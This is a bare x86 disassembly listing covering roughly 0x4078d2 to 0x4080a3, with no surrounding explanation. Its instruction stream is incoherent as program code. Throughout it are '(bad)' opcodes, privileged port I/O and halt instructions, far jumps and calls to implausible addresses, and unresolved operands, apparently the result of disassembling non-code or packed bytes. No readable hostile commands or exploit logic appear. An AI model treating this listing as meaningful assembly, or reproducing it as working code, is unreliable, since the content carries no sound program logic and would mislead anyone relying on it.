  4078d2:	add    al,0xbe
  4078d4:	bound  esi,QWORD PTR [ebp-0x4]
  4078d7:	jl     0x4078f1
  4078d9:	test   al,0xb9
  4078db:	pop    edx
  4078dc:	mov    ch,0x54
  4078de:	es inc edx
  4078e0:	sbb    edx,DWORD PTR [edi-0xd9cd0b5]
  4078e6:	sbb    ebp,DWORD PTR [ebx+0x2d9b758d]
  4078ec:	push   es
  4078ed:	loope  0x407902
  4078ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078f0:	sub    DWORD PTR [edx],esp
  4078f2:	fs int 0x7b
  4078f5:	xchg   ebx,eax
  4078f6:	jecxz  0x4078fc
  4078f8:	sbb    DWORD PTR [edi+0x38],esp
  4078fb:	jmp    0x4f1698e0
  407900:	or     eax,0x92af285b
  407905:	xchg   DWORD PTR ds:0xf3ad0c05,eax
  40790b:	xchg   edx,eax
  40790c:	xor    DWORD PTR gs:[esi-0x6d88c659],edi
  407913:	add    bh,BYTE PTR [ebx-0x26]
  407916:	or     esp,DWORD PTR [ecx+0x35]
  407919:	mov    ebp,0x97026dbd
  40791e:	fild   QWORD PTR [eax-0x6a55c787]
  407924:	pop    edx
  407925:	pop    esp
  407926:	ss xor al,0xcf
  407929:	pop    eax
  40792a:	mov    ds:0x8381aa8b,eax
  40792f:	shr    BYTE PTR [esi-0x68],0xd3
  407933:	out    0x5e,eax
  407935:	int3   
  407936:	in     al,dx
  407937:	sub    DWORD PTR [edi],esi
  407939:	sbb    dl,ah
  40793b:	out    dx,eax
  40793c:	gs dec ebx
  40793e:	or     dh,BYTE PTR [edi+esi*4]
  407941:	les    eax,FWORD PTR [esi-0x6f]
  407944:	hlt    
  407945:	pop    ecx
  407946:	call   0x79ec0172
  40794b:	scas   eax,DWORD PTR es:[edi]
  40794c:	and    eax,0xbb74fa42
  407951:	jbe    0x407977
  407953:	out    dx,al
  407954:	and    bh,BYTE PTR [ecx+edx*2+0x488ec36b]
  40795b:	xor    eax,0xf8c8fec5
  407960:	sbb    eax,0x6682232b
  407965:	fimul  WORD PTR [esi+0x19]
  407968:	add    dh,al
  40796a:	es iret 
  40796c:	mov    ecx,0x6ea57b55
  407971:	repnz lods al,BYTE PTR ds:[esi]
  407973:	leave  
  407974:	mov    ?,WORD PTR [eax]
  407976:	jl     0x407969
  407978:	inc    eax
  407979:	nop
  40797a:	retf   
  40797b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40797c:	jg     0x40793b
  40797e:	sub    ebx,edi
  407980:	ins    DWORD PTR es:[edi],dx
  407981:	mov    ecx,0x629d032
  407986:	pop    ecx
  407987:	pop    ebx
  407988:	inc    ebp
  407989:	pop    edi
  40798a:	mov    bl,0x86
  40798c:	sub    BYTE PTR [edi+ebp*4],ch
  40798f:	std    
  407990:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407991:	push   es
  407992:	sub    ch,BYTE PTR [eax+0x2641bf37]
  407998:	fidivr WORD PTR ds:0xde4aa8d4
  40799e:	mov    bl,0x1d
  4079a0:	iret   
  4079a1:	mov    dl,0xd5
  4079a3:	div    BYTE PTR [edx-0x62]
  4079a6:	cmp    edi,DWORD PTR [ebx]
  4079a8:	pop    ds
  4079a9:	and    eax,0x311c7e2e
  4079ae:	jo     0x4079c3
  4079b0:	mov    esi,es
  4079b2:	out    dx,al
  4079b3:	xor    BYTE PTR [esi+0x4cd2236b],bl
  4079b9:	mov    ds:0xf66c769e,al
  4079be:	xchg   esi,eax
  4079bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079c0:	mov    ds:0xe64c4abb,al
  4079c5:	std    
  4079c6:	sub    DWORD PTR [eax+0x4],ebp
  4079c9:	je     0x407a4a
  4079cb:	and    ch,BYTE PTR [ebp-0x3]
  4079ce:	aad    0xce
  4079d0:	and    DWORD PTR [ebx-0x75],0x671e99b1
  4079d7:	sub    eax,0x293762b1
  4079dc:	pop    esp
  4079dd:	test   eax,0x911fa669
  4079e2:	dec    ebx
  4079e3:	pop    ds
  4079e4:	outs   dx,DWORD PTR ds:[esi]
  4079e5:	addr16 (bad) 
  4079e8:	inc    ebp
  4079e9:	int    0xcf
  4079eb:	gs mov ecx,0x910663c2
  4079f1:	shr    dl,cl
  4079f3:	add    al,0xbd
  4079f5:	sbb    esp,esi
  4079f7:	add    esp,DWORD PTR [edi+0xf61d017]
  4079fd:	adc    eax,eax
  4079ff:	(bad)  
  407a00:	adc    al,0x28
  407a02:	adc    al,0x8e
  407a04:	pand   mm1,mm7
  407a07:	sbb    eax,0x26238c59
  407a0c:	test   DWORD PTR [ebx-0x5],ebp
  407a0f:	mov    es,edi
  407a11:	pusha  
  407a12:	call   0xbe627f38
  407a17:	xor    dl,BYTE PTR [edx+0x29cadc19]
  407a1d:	iret   
  407a1e:	ds rcr bh,0x58
  407a22:	xor    eax,0xf34c47e8
  407a27:	mov    ch,BYTE PTR [eax]
  407a29:	dec    ebx
  407a2a:	and    cl,BYTE PTR [edx]
  407a2c:	cmc    
  407a2d:	out    dx,al
  407a2e:	les    ecx,FWORD PTR [ebp-0x7c50e42d]
  407a34:	push   ebx
  407a35:	(bad)  [esi]
  407a37:	out    0xe5,eax
  407a39:	adc    al,0x14
  407a3b:	dec    esp
  407a3c:	pop    ebp
  407a3d:	inc    edi
  407a3e:	in     eax,dx
  407a3f:	dec    esp
  407a40:	or     eax,0x704358fa
  407a45:	sub    eax,0x66a2f238
  407a4a:	xor    bh,al
  407a4c:	cld    
  407a4d:	inc    esi
  407a4e:	pop    ebx
  407a4f:	into   
  407a50:	(bad)  
  407a51:	aad    0x45
  407a53:	adc    ebx,ebp
  407a55:	add    al,0xc5
  407a57:	ss add al,0x6
  407a5a:	(bad)
  407a5d:	jmp    0x407a1f
  407a5f:	xchg   BYTE PTR [esi+0x5],dl
  407a62:	jno    0x407a0a
  407a64:	sbb    esi,DWORD PTR [eax-0x17]
  407a67:	ja     0x407a37
  407a69:	outs   dx,BYTE PTR ds:[esi]
  407a6a:	xchg   BYTE PTR [ebx],dh
  407a6c:	shl    BYTE PTR [edx-0x7c],cl
  407a6f:	(bad)  
  407a70:	ds adc esi,esi
  407a73:	js     0x407a51
  407a75:	pop    esp
  407a76:	(bad)  
  407a78:	in     eax,dx
  407a79:	mov    DWORD PTR [edx],ecx
  407a7b:	rcl    DWORD PTR [edx-0x60],cl
  407a7e:	sub    al,0x7d
  407a80:	xchg   esi,eax
  407a81:	(bad)  
  407a82:	cmp    DWORD PTR [esi-0x639de725],esi
  407a88:	add    edi,0xf16355b0
  407a8e:	jmp    0xb64f9705
  407a93:	int    0x9c
  407a95:	or     al,0x9e
  407a97:	mov    ah,0x3d
  407a99:	sub    ebp,eax
  407a9b:	jge    0x407a2c
  407a9d:	call   0x7e9:0x479c2482
  407aa4:	ins    BYTE PTR es:[edi],dx
  407aa5:	sub    BYTE PTR [edi],0x52
  407aa8:	and    dh,BYTE PTR [ebp+0x65dc64e4]
  407aae:	or     al,0x95
  407ab0:	push   edi
  407ab1:	int3   
  407ab2:	fimul  DWORD PTR [ebx+0x7b]
  407ab5:	das    
  407ab6:	dec    esi
  407ab7:	cmp    DWORD PTR [esi],esi
  407ab9:	scas   eax,DWORD PTR es:[edi]
  407aba:	push   cs
  407abb:	retf   0x28ab
  407abe:	sub    esi,DWORD PTR [esi+0x7c19c10c]
  407ac4:	sti    
  407ac5:	and    edi,0x2aa39226
  407acb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407acc:	pop    ebx
  407acd:	int3   
  407ace:	pop    ss
  407acf:	mov    bl,BYTE PTR [ecx-0x1d44cfec]
  407ad5:	or     al,BYTE PTR [edx]
  407ad7:	sbb    esi,0x5df76066
  407add:	jecxz  0x407b14
  407adf:	(bad)  
  407ae0:	pop    edx
  407ae1:	inc    edi
  407ae2:	mov    esi,0xceabcc33
  407ae7:	adc    eax,0xf4ec0a0e
  407aec:	xchg   esi,eax
  407aed:	or     esi,esi
  407aef:	sahf   
  407af0:	call   0xe223:0xd53993e3
  407af7:	(bad)  [ecx-0x1c8cfd9a]
  407afd:	(bad)  
  407afe:	aam    0xab
  407b00:	xchg   BYTE PTR [esi],ch
  407b02:	mov    ebx,0x465bb1d0
  407b07:	add    DWORD PTR [esp+edi*4],ecx
  407b0a:	imul   eax,DWORD PTR [esi+0x73],0x43
  407b0e:	jo     0x407ac5
  407b10:	jns    0x407b65
  407b12:	and    ebx,DWORD PTR [ebx+0x6bbb781f]
  407b18:	xor    DWORD PTR [ebx-0x6b],ebx
  407b1b:	in     al,0xaa
  407b1d:	mov    al,ds:0x8885f44c
  407b22:	dec    edx
  407b23:	das    
  407b24:	add    DWORD PTR [eax-0x37],edx
  407b27:	daa    
  407b28:	sbb    eax,0x537833ab
  407b2d:	fnsave [edi]
  407b2f:	sbb    esi,DWORD PTR [ebx+0x7b]
  407b32:	add    BYTE PTR [esi-0x5a688d6b],ch
  407b38:	mov    al,ds:0xb6fe9e29
  407b3d:	adc    al,0x6c
  407b3f:	mov    ah,0xf5
  407b41:	pop    esi
  407b42:	or     al,0x5e
  407b44:	jo     0x407b31
  407b46:	pop    es
  407b47:	xor    eax,0xfdf31ed8
  407b4c:	inc    ecx
  407b4d:	mov    al,ds:0x68453791
  407b52:	or     al,0x19
  407b54:	inc    esp
  407b55:	and    dh,dl
  407b57:	fstp   QWORD PTR [esp+eiz*4+0x20d0d4d7]
  407b5e:	or     ah,BYTE PTR [esi-0x53426269]
  407b64:	cwde   
  407b65:	xlat   BYTE PTR ds:[ebx]
  407b66:	in     al,dx
  407b67:	mov    al,ds:0x773e3fb1
  407b6c:	dec    ebx
  407b6d:	dec    esi
  407b6e:	arpl   WORD PTR ds:0x5ed10db,sp
  407b74:	hlt    
  407b75:	dec    ebp
  407b76:	fdivr  QWORD PTR [ecx-0xa80a4cc]
  407b7c:	fistp  WORD PTR [edi]
  407b7e:	adc    ebp,0xffffffc2
  407b81:	pop    eax
  407b82:	dec    edx
  407b83:	out    0xb2,eax
  407b85:	in     al,0x1d
  407b87:	leave  
  407b88:	aas    
  407b89:	push   0xa80b4b94
  407b8e:	stos   BYTE PTR es:[edi],al
  407b8f:	fst    QWORD PTR [edx-0x54]
  407b92:	shl    BYTE PTR [ecx-0x46],cl
  407b95:	and    al,bh
  407b97:	scas   al,BYTE PTR es:[edi]
  407b98:	bnd jne 0x407c05
  407b9b:	inc    esp
  407b9c:	push   ecx
  407b9d:	xchg   ecx,eax
  407b9e:	pusha  
  407b9f:	xor    al,0x4f
  407ba1:	aas    
  407ba2:	mov    dl,0x81
  407ba4:	sbb    eax,0x72b5e329
  407ba9:	dec    ebx
  407baa:	fdiv   st,st(7)
  407bac:	stc    
  407bad:	adc    BYTE PTR [edx+0x26245ef1],cl
  407bb3:	out    dx,al
  407bb4:	aaa    
  407bb5:	ret    0xb445
  407bb8:	push   es
  407bb9:	xor    ah,BYTE PTR [edx]
  407bbb:	(bad)  
  407bbd:	jns    0x407bd1
  407bbf:	mov    ds:0x19b07c4d,al
  407bc4:	aam    0x13
  407bc6:	call   0xd7c9cace
  407bcb:	adc    BYTE PTR [ebx],0x36
  407bce:	icebp  
  407bcf:	add    esi,esi
  407bd1:	sbb    ebx,edi
  407bd3:	jo     0x407bdf
  407bd5:	mov    ah,0x11
  407bd7:	or     bl,BYTE PTR [ebp+0x1ea55a2a]
  407bdd:	stos   DWORD PTR es:[edi],eax
  407bde:	adc    BYTE PTR [ecx],0x45
  407be1:	test   eax,0x36b4a69d
  407be6:	or     BYTE PTR [edx-0x25],0xe0
  407bea:	imul   esp,DWORD PTR [esi+ebp*4-0x18797443],0x55
  407bf2:	sub    DWORD PTR [edx+eiz*4],0xffffffd5
  407bf6:	mov    edi,0x76f1fb31
  407bfb:	loop   0x407bc7
  407bfd:	jp     0x407c40
  407bff:	mov    ebp,0x832475e
  407c04:	test   DWORD PTR [eax+eax*2-0x1613e155],eax
  407c0b:	jg     0x407c10
  407c0d:	es (bad) 
  407c0f:	xchg   edi,eax
  407c10:	fistp  WORD PTR [ecx]
  407c12:	mov    ds:0x3a05b5e3,al
  407c17:	dec    edi
  407c18:	ficom  DWORD PTR [edx+ebp*2+0x6a4bcf05]
  407c1f:	cli    
  407c20:	loop   0x407c6f
  407c22:	mov    edx,0x6d7ad249
  407c27:	aaa    
  407c28:	retf   0x60bc
  407c2b:	pop    edx
  407c2c:	loop   0x407bf6
  407c2e:	dec    ecx
  407c2f:	sbb    DWORD PTR [ebp+0x46405ef4],eax
  407c35:	ins    BYTE PTR es:[edi],dx
  407c36:	and    al,0xc6
  407c38:	or     DWORD PTR [edx],ebx
  407c3a:	or     eax,0x3fe78dd6
  407c3f:	test   eax,0x7baa1f6b
  407c44:	mov    esp,0x8af9ef24
  407c49:	fidiv  DWORD PTR [ecx+eiz*1-0x6a31a964]
  407c50:	and    eax,0x6cc0eeb0
  407c55:	or     DWORD PTR [ebx+0x7e89bc1],esi
  407c5b:	push   edx
  407c5c:	push   eax
  407c5d:	pop    esi
  407c5e:	xor    ebx,ecx
  407c60:	addr16 cs jp 0x407c38
  407c64:	jb     0x407be8
  407c66:	push   ecx
  407c67:	xor    eax,0x20c5df2e
  407c6c:	mov    ebx,cs
  407c6e:	and    bh,BYTE PTR [edx]
  407c70:	out    0x70,al
  407c72:	(bad)
  407c76:	sbb    DWORD PTR [eax+0x47],edx
  407c79:	jmp    0x407cb9
  407c7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c7c:	push   ecx
  407c7d:	mov    eax,0xfe10ada4
  407c82:	out    0xa4,eax
  407c84:	das    
  407c85:	retf   
  407c86:	shl    dh,cl
  407c88:	or     BYTE PTR [edi+0x1c8b99ab],dl
  407c8e:	mov    DWORD PTR [edi+0x76],esp
  407c91:	sub    BYTE PTR [eax-0x12],dh
  407c94:	pop    ecx
  407c95:	mov    dh,0x32
  407c97:	xchg   DWORD PTR [esi],edx
  407c99:	cmp    cl,cl
  407c9b:	mov    bh,ch
  407c9d:	adc    ebx,DWORD PTR [esi-0x19daa06f]
  407ca3:	cmp    al,0x57
  407ca5:	push   0x1
  407ca7:	out    dx,al
  407ca8:	push   eax
  407ca9:	sbb    BYTE PTR [ebx-0x6679ce1e],cl
  407caf:	add    eax,0x98e2b22f
  407cb4:	bound  ecx,QWORD PTR [esi+0xfd780db]
  407cba:	jae    0x407c4f
  407cbc:	out    0x23,al
  407cbe:	add    BYTE PTR [ebx],0x9f
  407cc1:	int    0xc
  407cc3:	dec    ebx
  407cc4:	pop    esi
  407cc5:	xchg   esi,eax
  407cc6:	fwait
  407cc7:	xchg   edx,eax
  407cc8:	jg     0x407d33
  407cca:	adc    edx,DWORD PTR [edi-0x4f]
  407ccd:	xchg   ecx,eax
  407cce:	mov    bl,0xbe
  407cd0:	das    
  407cd1:	lods   eax,DWORD PTR ds:[esi]
  407cd2:	in     eax,dx
  407cd3:	stc    
  407cd4:	mov    ?,WORD PTR [ecx]
  407cd6:	inc    eax
  407cd7:	cs loope 0x407cb9
  407cda:	xor    bl,ch
  407cdc:	mov    ebx,0xae3d6fc4
  407ce1:	xchg   BYTE PTR [edi],ah
  407ce3:	ret    0x9eb7
  407ce6:	mov    DWORD PTR [ecx+edi*4],esi
  407ce9:	call   0xc599:0x1ee1eabc
  407cf0:	outs   dx,DWORD PTR ds:[esi]
  407cf1:	pop    DWORD PTR [esi]
  407cf3:	aam    0x9c
  407cf5:	sbb    ecx,DWORD PTR [ecx-0x438c7d1]
  407cfb:	hlt    
  407cfc:	xlat   BYTE PTR ds:[ebx]
  407cfd:	lds    esp,FWORD PTR [ebx]
  407cff:	adc    al,0x1a
  407d01:	sbb    cl,bh
  407d03:	jg     0x407d3d
  407d05:	sub    DWORD PTR [ecx-0x37],0xfffffffe
  407d09:	das    
  407d0a:	sbb    ecx,ebx
  407d0c:	out    dx,eax
  407d0d:	push   esp
  407d0e:	or     al,BYTE PTR [edx+0x1c]
  407d11:	mov    ebx,0x292bb749
  407d16:	imul   BYTE PTR [eax]
  407d18:	xchg   ecx,eax
  407d19:	adc    DWORD PTR [edx],ecx
  407d1b:	ror    DWORD PTR [ecx+0x6b],cl
  407d1e:	cmp    al,0x77
  407d20:	(bad)  
  407d21:	aas    
  407d22:	adc    al,0xaa
  407d24:	adc    DWORD PTR [ebx],ebx
  407d26:	push   esp
  407d27:	ret    0xebd5
  407d2a:	aam    0xe6
  407d2c:	push   edi
  407d2d:	cmc    
  407d2e:	cmc    
  407d2f:	xchg   ebx,eax
  407d30:	jne    0x407d9e
  407d32:	pop    edx
  407d33:	and    DWORD PTR [edx+0x54147159],edi
  407d39:	xchg   esp,eax
  407d3a:	inc    edx
  407d3b:	jns    0x7e558705
  407d41:	in     eax,0xf2
  407d43:	fwait
  407d44:	cs xchg esi,eax
  407d46:	enter  0xdbec,0x94
  407d4a:	inc    eax
  407d4b:	jo     0x407d82
  407d4d:	or     eax,DWORD PTR [eax+edi*4+0x6d7bcb87]
  407d54:	popa   
  407d55:	pop    ebx
  407d56:	outs   dx,BYTE PTR ds:[esi]
  407d57:	pop    ss
  407d58:	add    al,0xa8
  407d5a:	and    bh,BYTE PTR [edi-0x66bb1188]
  407d60:	out    dx,eax
  407d61:	mov    bh,0xf6
  407d63:	and    edi,DWORD PTR [edi]
  407d65:	loop   0x407d3a
  407d67:	pop    edi
  407d68:	inc    esp
  407d69:	retf   0x753c
  407d6c:	lods   eax,DWORD PTR ds:[esi]
  407d6d:	jecxz  0x407ddc
  407d6f:	push   0x60826c0c
  407d74:	pop    es
  407d75:	xchg   BYTE PTR [edx],bh
  407d77:	pop    es
  407d78:	dec    ecx
  407d79:	or     BYTE PTR [ebx-0x32ae9663],0x9a
  407d80:	rcr    bh,0x7e
  407d83:	inc    ecx
  407d84:	in     al,0xd8
  407d86:	mov    bh,0xd5
  407d88:	icebp  
  407d89:	or     al,0xb0
  407d8b:	push   ecx
  407d8c:	leave  
  407d8d:	add    ebp,DWORD PTR [edx]
  407d8f:	test   al,0x20
  407d91:	push   ds
  407d92:	dec    esp
  407d93:	xor    cl,BYTE PTR [esi-0x58898f2d]
  407d99:	sub    al,0x57
  407d9b:	jb     0x407d4e
  407d9d:	aaa    
  407d9e:	mov    dh,0xa8
  407da0:	call   0x92a0e32a
  407da5:	mov    ds:0xf20c5b06,eax
  407daa:	mov    edx,0x86ad560
  407daf:	into   
  407db0:	adc    DWORD PTR ds:0x597b6e4a,ebx
  407db6:	sub    eax,0xbed91c95
  407dbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dbc:	popf   
  407dbd:	mov    esi,0xd3c95d4
  407dc2:	into   
  407dc3:	in     eax,dx
  407dc4:	dec    esp
  407dc5:	imul   ecx,DWORD PTR [edx],0x65
  407dc8:	scas   al,BYTE PTR es:[edi]
  407dc9:	ret    
  407dca:	jno    0x407de6
  407dcc:	xor    al,0xcc
  407dce:	pop    ecx
  407dcf:	add    ch,BYTE PTR [edi+0x627859ad]
  407dd5:	jmp    0xe280:0xcb7f9b76
  407ddc:	shl    BYTE PTR [ecx-0x4],cl
  407ddf:	sbb    al,0x85
  407de1:	sub    ecx,DWORD PTR [edx-0x2d]
  407de4:	imul   ecx,eax,0xd7d392c9
  407dea:	or     eax,DWORD PTR [eax-0x51]
  407ded:	aas    
  407dee:	mov    ?,WORD PTR [eax-0x98d9a90]
  407df4:	cmp    BYTE PTR [eax+ecx*8],dh
  407df7:	daa    
  407df8:	mov    fs,WORD PTR ds:0x5f5219f0
  407dfe:	inc    esp
  407dff:	aaa    
  407e00:	pop    eax
  407e01:	adc    al,0xce
  407e03:	adc    BYTE PTR [ebp-0x68],al
  407e06:	mov    ch,0x4e
  407e08:	pop    ds
  407e09:	or     eax,DWORD PTR [ecx]
  407e0b:	jne    0x407ddd
  407e0d:	stos   BYTE PTR es:[edi],al
  407e0e:	psubusb mm0,QWORD PTR [esi+ebp*4]
  407e12:	daa    
  407e13:	sti    
  407e14:	sbb    al,0x88
  407e16:	push   esp
  407e17:	pop    es
  407e18:	dec    edx
  407e19:	adc    eax,0x21007046
  407e1e:	pop    esi
  407e1f:	cmp    eax,0x64860804
  407e24:	jbe    0x407e76
  407e26:	repnz sar BYTE PTR [edi-0x6c87dd4],cl
  407e2d:	jge    0x407df7
  407e2f:	sbb    al,dl
  407e31:	push   ss
  407e32:	inc    ebx
  407e33:	js     0x407dfd
  407e35:	(bad)  
  407e36:	mov    ah,0x50
  407e38:	mov    bl,BYTE PTR [edi]
  407e3a:	sub    bh,0x7e
  407e3d:	cmp    BYTE PTR [ecx+0x403eb79b],cl
  407e43:	nop
  407e44:	pop    edi
  407e46:	inc    ebp
  407e47:	js     0x407e7f
  407e49:	adc    BYTE PTR [edi-0xd],ch
  407e4c:	or     DWORD PTR [edi+0x1e],0x7
  407e50:	(bad)  
  407e51:	xchg   edi,eax
  407e52:	jbe    0x407e6b
  407e54:	or     al,0x78
  407e56:	pushf  
  407e57:	push   ss
  407e58:	cmc    
  407e59:	pop    edx
  407e5a:	xor    edi,ebp
  407e5c:	push   0x41
  407e5e:	faddp  st(0),st
  407e60:	daa    
  407e61:	mov    edi,0x76d452e0
  407e66:	mov    esp,0xfd49fa39
  407e6b:	xlat   BYTE PTR ds:[ebx]
  407e6c:	lods   al,BYTE PTR ds:[esi]
  407e6d:	xchg   ebx,eax
  407e6e:	inc    esi
  407e6f:	pop    ds
  407e70:	std    
  407e71:	in     eax,0x5f
  407e73:	sub    al,BYTE PTR [esp+eiz*2]
  407e76:	stc    
  407e77:	inc    ebp
  407e78:	jo     0x407ef2
  407e7a:	adc    esp,DWORD PTR [eax]
  407e7c:	test   eax,0x673efe3f
  407e81:	dec    ebx
  407e82:	in     eax,dx
  407e83:	loopne 0x407e68
  407e85:	xchg   edi,eax
  407e86:	(bad)  
  407e88:	aas    
  407e89:	pushf  
  407e8a:	xor    eax,0xec5078fe
  407e8f:	cmc    
  407e90:	fs ds pop ecx
  407e93:	mov    bh,0x7a
  407e95:	mov    edx,es
  407e97:	xor    edx,DWORD PTR [esi+edx*4-0x14]
  407e9b:	lea    ebx,[edi-0xfbe030f]
  407ea1:	out    dx,eax
  407ea2:	loopne 0x407f02
  407ea4:	or     eax,0xe4dd7e61
  407ea9:	nop
  407eaa:	cmp    ch,dl
  407eac:	pop    ecx
  407ead:	push   eax
  407eae:	lock je 0x407ea0
  407eb1:	jne    0x407ec7
  407eb3:	ficomp DWORD PTR [eax+0x50b79921]
  407eb9:	sbb    DWORD PTR [edx-0x3248b69f],0x20e810b5
  407ec3:	dec    ebx
  407ec4:	jl     0x407eab
  407ec6:	popf   
  407ec7:	dec    ebx
  407ec8:	out    0x68,al
  407eca:	test   BYTE PTR [eax-0x57c6ebc8],ah
  407ed0:	clc    
  407ed1:	fcmovnbe st,st(4)
  407ed3:	sbb    al,0xc0
  407ed5:	dec    dl
  407ed7:	mov    ds:0xdf0bb672,eax
  407edc:	push   0xffffff98
  407ede:	pop    ebp
  407edf:	test   eax,0x9d9ea0b1
  407ee4:	out    dx,al
  407ee5:	mov    edi,0xd1d8f1e0
  407eea:	adc    DWORD PTR [esi],ecx
  407eec:	les    ebx,FWORD PTR [edi-0x10acb2c5]
  407ef2:	sahf   
  407ef3:	(bad)  
  407ef4:	call   0x3b49389b
  407ef9:	pop    ecx
  407efa:	frstor [eax]
  407efc:	and    bh,BYTE PTR [esi]
  407efe:	jg     0x407f2a
  407f00:	cld    
  407f01:	scas   al,BYTE PTR es:[edi]
  407f02:	mov    edi,0xe0514851
  407f07:	shl    BYTE PTR [esi-0xf69e6e3],1
  407f0d:	out    dx,eax
  407f0e:	(bad)  
  407f10:	mov    dl,0xea
  407f12:	jle    0x407f03
  407f14:	mov    ds:0xb0a8f3fe,al
  407f19:	arpl   WORD PTR ds:0x5f57c1d7,ax
  407f1f:	inc    ecx
  407f20:	xor    BYTE PTR [ebp-0x8],ch
  407f23:	les    ebp,FWORD PTR [eax]
  407f25:	and    esi,eax
  407f27:	and    BYTE PTR [ebp+0x35],dl
  407f2a:	lds    edi,FWORD PTR [ebp-0x31]
  407f2d:	in     al,0x62
  407f2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f30:	mov    esi,DWORD PTR [edx-0x5a]
  407f33:	jmp    0xff35:0x73f3331a
  407f3a:	shl    edi,cl
  407f3c:	pusha  
  407f3d:	mov    ch,0x39
  407f3f:	jge    0x407f54
  407f41:	sub    al,0x73
  407f43:	mov    dl,0x6a
  407f45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f46:	inc    eax
  407f47:	repnz adc al,0x7d
  407f4a:	inc    ecx
  407f4b:	xchg   edi,eax
  407f4c:	push   edx
  407f4d:	in     al,dx
  407f4e:	or     eax,0x5e64a587
  407f53:	adc    al,0x9
  407f55:	xchg   esp,eax
  407f56:	ror    esp,0x1b
  407f59:	ins    BYTE PTR es:[edi],dx
  407f5a:	popf   
  407f5b:	sub    ch,dl
  407f5d:	fs hlt 
  407f5f:	ret    
  407f60:	fs ins BYTE PTR es:[edi],dx
  407f62:	in     eax,0xe1
  407f64:	xor    BYTE PTR [esi+0x26a64dd7],0x4b
  407f6b:	and    DWORD PTR [edx-0x57087e91],edx
  407f71:	test   al,0x78
  407f73:	and    eax,DWORD PTR [ecx]
  407f75:	popa   
  407f76:	jae    0x407fcd
  407f78:	js     0x407f52
  407f7a:	sub    al,0x1d
  407f7c:	cld    
  407f7d:	mov    eax,ds:0x78d3ba8e
  407f82:	cmp    BYTE PTR [bx+di+0x4e],bh
  407f86:	retf   0xb505
  407f89:	(bad)  
  407f8a:	cdq    
  407f8b:	and    ebp,DWORD PTR ds:0x70acec7
  407f91:	dec    ebx
  407f92:	div    DWORD PTR [eax]
  407f94:	cmp    al,0x53
  407f96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f97:	js     0x407f2f
  407f99:	scas   al,BYTE PTR es:[edi]
  407f9a:	nop
  407f9b:	jmp    0xcf53:0x64ccbafd
  407fa2:	outs   dx,BYTE PTR ds:[esi]
  407fa3:	dec    eax
  407fa4:	push   ss
  407fa5:	imul   ebp,DWORD PTR [ebp-0x2ddf04e6],0xffffffd7
  407fac:	mov    fs,edx
  407fae:	or     edx,DWORD PTR ds:0x103a8bde
  407fb4:	xchg   BYTE PTR [edx-0x64a749e4],ch
  407fba:	and    al,0x3
  407fbc:	jne    0x407fba
  407fbe:	int3   
  407fbf:	mov    eax,DWORD PTR [ebp-0x38b8640d]
  407fc5:	xchg   ecx,eax
  407fc6:	or     eax,0xc7de72ab
  407fcb:	outs   dx,DWORD PTR ds:[esi]
  407fcc:	mov    ds:0x966210ad,al
  407fd1:	mov    dl,0xd3
  407fd3:	mov    al,0x10
  407fd5:	or     eax,0x2e15cb13
  407fda:	mov    eax,ds:0x121f68db
  407fdf:	loopne 0x408003
  407fe1:	retf   
  407fe2:	mov    DWORD PTR fs:[esi+0x4c],edi
  407fe6:	ret    
  407fe7:	xchg   ebp,eax
  407fe8:	outs   dx,BYTE PTR ds:[esi]
  407fe9:	popa   
  407fea:	fwait
  407feb:	nop
  407fec:	test   DWORD PTR [edx+ebx*8+0x2f],edi
  407ff0:	mov    cl,0xa
  407ff2:	loopne 0x407fa5
  407ff4:	add    al,dl
  407ff6:	mov    DWORD PTR [ebx],ebx
  407ff8:	dec    ecx
  407ff9:	dec    esi
  407ffa:	mov    esi,0xe6d50a8d
  407fff:	xor    ebx,DWORD PTR [edi]
  408001:	add    eax,0x11c2c040
  408006:	xchg   ecx,esp
  408008:	dec    esi
  408009:	int3   
  40800a:	bnd jg 0x407fa7
  40800d:	aaa    
  40800e:	push   0x22
  408010:	enter  0xe101,0x92
  408014:	out    dx,eax
  408015:	pop    ebx
  408016:	dec    ecx
  408017:	(bad)  [ebx]
  408019:	cmp    edi,DWORD PTR [ecx+edx*4+0xd]
  40801d:	xor    esp,DWORD PTR [edx+ebx*8-0x714a800]
  408024:	daa    
  408025:	dec    edi
  408026:	cmp    eax,0x8fefa5a9
  40802b:	ja     0x408083
  40802d:	mov    ch,BYTE PTR [eax-0x3d28a11e]
  408033:	fidivr WORD PTR [edx+0x6f88bbec]
  408039:	hlt    
  40803a:	into   
  40803b:	mov    ch,BYTE PTR [ebx+0x5d80e299]
  408041:	pop    ebp
  408042:	cwde   
  408043:	adc    DWORD PTR [ebx],esp
  408045:	add    BYTE PTR [ecx+eax*4-0x39],ah
  408049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40804a:	jmp    FWORD PTR [ebx-0x3e]
  40804d:	arpl   ax,sp
  40804f:	pop    edi
  408050:	xchg   ebp,eax
  408051:	mov    ah,BYTE PTR [eax-0x33]
  408054:	jb     0x408075
  408056:	add    al,0xa7
  408058:	jno    0x40803e
  40805a:	dec    ebp
  40805b:	imul   ebp,DWORD PTR [eax+0x650c6adf],0xfffffffd
  408062:	mov    ebp,0x5d33900b
  408067:	mov    dh,0xa3
  408069:	cmc    
  40806a:	add    ecx,0xffffff8c
  40806d:	adc    al,0xda
  40806f:	mov    ecx,0x22f9fa77
  408074:	jge    0x40804c
  408076:	sbb    DWORD PTR [esi+0xf062264],edx
  40807c:	and    al,0x75
  40807e:	(bad)  
  40807f:	sahf   
  408080:	push   edx
  408082:	pop    ecx
  408083:	(bad)
  408086:	cmp    al,0xc0
  408088:	enter  0xb63f,0xff
  40808c:	inc    DWORD PTR [ebx-0x43]
  40808f:	ds sbb eax,0xa2716907
  408095:	mov    ds:0x5632302e,eax
  40809a:	leave  
  40809b:	xchg   DWORD PTR [ecx+edx*8-0x1d81bc],edx
  4080a2:	inc    edi
  4080a3:	ja     0x40803f
